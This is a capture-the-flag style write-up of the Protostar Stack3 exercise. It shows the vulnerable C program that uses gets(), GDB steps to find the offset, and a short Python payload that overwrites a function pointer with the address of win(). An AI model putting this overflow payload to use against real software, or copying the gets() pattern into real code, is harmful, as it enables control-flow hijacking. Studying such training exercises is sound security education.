# Protostar Stack3

Like the last couple problems on stack, this problem gives us the source code below:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

Where `win()` seems to be the objective function to execute. This program is once again using gets for its arguments, much like the last couple problems. This time, however, instead of passing a check for a particular condition, the program will simply call the overwritten variable. The variable `fp` itself is initialized as an integer pointer, which will call anything at the specified address when called as a function.

The objective of this problem is to modify the `fp` variable in such a way that it includes the address for the `win()` function.

## Initial Surveying

So, to GDB we go:
> gdb stack3

Examine the memory at win function:
> x win

Which returns `0x8048424 <win>:	0x83e58955`, which should be where the win function is located in memory. Like always, set the disassembler flavor to intel for easier reading, and take a look inside main:
> set disassembly-flavor intel

> disassemble main

which reveals: `0x0804843e <main+6>:	sub    esp,0x60`, implying that like the previous problems, hex 60 bytes are allocated to the stack by setting `esp`, stack pointer value. `0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0` following means that the space for `fp` variable is made with hex 5c offset from the stack pointer, making it susceptible to overflow. Later on, `0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0` checks if the value is still zero, and if not, `0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]` moves the value of `fp` to `eax`, and `0x08048475 <main+61>:	call   eax` calls whatever is on the address specified.

Set a break point on the last call function and run:
> break *0x08048475

> r

and input a bunch of text when prompted:
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

which returns:
> calling function pointer, jumping to 0x41414141

Take a look at the register values with
> info registers

Sure enough, the first line specifies `eax            0x41414141	1094795585`, meaning that the eax values have been overwritten with a bunch of 41s, which is the hex value for A. So now, the program should call this address, and prompt it to call whatever is located there. Continue execution with:
> c

Which returns:

```
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

Which makes sense, as `0x41414141` is a bogus value as an address, causing segmentation fault.

## Figuring out a correct input (Writing the actual 'exploit')

So how do we change that to an actual address, namely where `win()` is located?

We begin by figuring out which offset determines the address to access. Start by making a simple python script that just prints a bunch of letters.
```
print("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT")
```

Pipe the output of the python script into another file so we don't have to execute it everytime:
> python stack3_exploit.py > exp

`cat exp` will print the string. Now, back in GDB, run the function with the contents of `exp` as input arguments with
> r < /tmp/exp

Once we get to the break point, take a look at the register values again to see `eax            0x51515151	1364283729`, meaning that eax values were changed to 51s, which is the hex value for the character Q (chr(x51) for python). This means that out of the strings we specified in the above script, the `QQQQ` denotes the address that we have to jump to.

Modify the former script to the one below:
```
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
padding += "\x24\x84\x04\x08" # Ascii representation of 0x8048424
print padding
```
`\x{num}` is the ascii escape. The ascii representation is backwards because this binary format is ***little endian***.

Run the gdb again with the output of the script as arguments, and the register value for of `eax` should be the address location of the `win()` function. Finally, the function returns `code flow successfully changed`, denoting successful manipulation.
